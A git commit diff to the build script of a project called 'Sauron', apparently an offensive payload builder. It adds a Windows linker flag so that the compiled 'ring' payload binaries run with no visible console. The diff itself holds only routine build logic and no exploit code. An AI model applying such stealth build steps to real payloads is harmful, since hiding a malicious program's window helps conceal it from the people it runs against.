1a42445b1dc48477528288de90f44b44f6a10cfd
Mustafa Abdulaziz Hamza <mustafa.abdulaziz.hamza@gmail.com>
2025-05-26 11:45:16 +0300

    The console will be hidden for payloads targetting windows platforms.

--- Sauron/build.sh
+++ Sauron/build.sh
@@ -7,15 +7,26 @@ OUTPUT_DIR=$3
 echo "[*] Building for $TARGET_OS/$TARGET_ARCH..."
 
 mkdir -p "$OUTPUT_DIR"
-cd src
-GOOS=$TARGET_OS GOARCH=$TARGET_ARCH go build -o "$OUTPUT_DIR/ring-$TARGET_OS-$TARGET_ARCH"
+cd src || exit 1
+
+EXT=""
+LDFLAGS=""
+if [[ "$TARGET_OS" == "windows" ]]; then
+  EXT=".exe"
+  LDFLAGS='-ldflags -H=windowsgui'
+fi
+
+OUTPUT_FILE="$OUTPUT_DIR/ring-$TARGET_OS-$TARGET_ARCH$EXT"
+
+GOOS=$TARGET_OS GOARCH=$TARGET_ARCH go build $LDFLAGS -o "$OUTPUT_FILE"
 
 if [[ $? -ne 0 ]]; then
   echo "[!] Build failed!"
   exit 1
 fi
-cd ..
+
+cd .. || exit 1
 echo "[*] Build succeeded"
 rm -f ./src/add.go
 
-echo "[+] Done! Binary saved to $OUTPUT_DIR/ring-$TARGET_OS-$TARGET_ARCH"
+echo "[+] Done! Binary saved to $OUTPUT_FILE"
